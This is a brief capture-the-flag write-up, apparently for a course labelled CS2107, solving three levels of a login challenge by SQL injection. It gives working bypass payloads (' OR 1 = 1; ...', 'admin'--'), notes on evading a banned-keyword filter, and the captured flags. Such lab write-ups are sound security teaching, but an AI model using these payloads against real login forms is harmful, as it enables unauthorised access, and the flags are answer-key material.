### Part1
SQL query: `SELECT * FROM USERS WHERE username = '$username' AND pass = '$password';`, We probably need `SELECT * FROM USERS`
1. Try making 2 queries: password = `'; SELECT * FROM USERS WHERE '' = '`. Failed, first query must pass.
2. Force `WHERE` to be true: username = `' OR 1 = 1; SELECT * FROM USERS WHERE username = '`. First query = `SELECT * FROM USERS WHERE username = '' or 1 = 1;`
Flag: `CS2107{9r33N_l19h7_R3D_L19H7_jybBZC67EtVM6YdK}`

`No CREATE, INSERT, REPLACE, RENAME, ALTER, DELETE, UPDATE, DROP.`
### Part2
1. try previous flag: `Please provide the correct SHA256 hash of Red Light, Green Light (Level 1) Flag! `
2. compute SHA256 [https://emn178.github.io/online-tools/sha256.html](https://emn178.github.io/online-tools/sha256.html): `5f3c01434c8903517cd334c1352e1cea9b49acfacd8d1db6a903e7a67d12c177`
Query: `SELECT * FROM USERS WHERE username = '$username' AND pass = '$password';`
1. Try same SQL injection: `SQL injection detected`
2. Test if check for multiple queries: password = `' OR '' = '`, failed
3. Check banned words: `OR`, `INSERT`
4. Try guessing usernames: `root`, `admin`
5. `admin` passed with `admin'--`
`CS2107{15_9lUc053_t45tY_qRkkru6hkzBVCZdM}`

### Part3
1. Try `admin` again
2. `CS2107{4R3_w3_47_7h3_3nd_8uN57k5se2Kkv8hL}`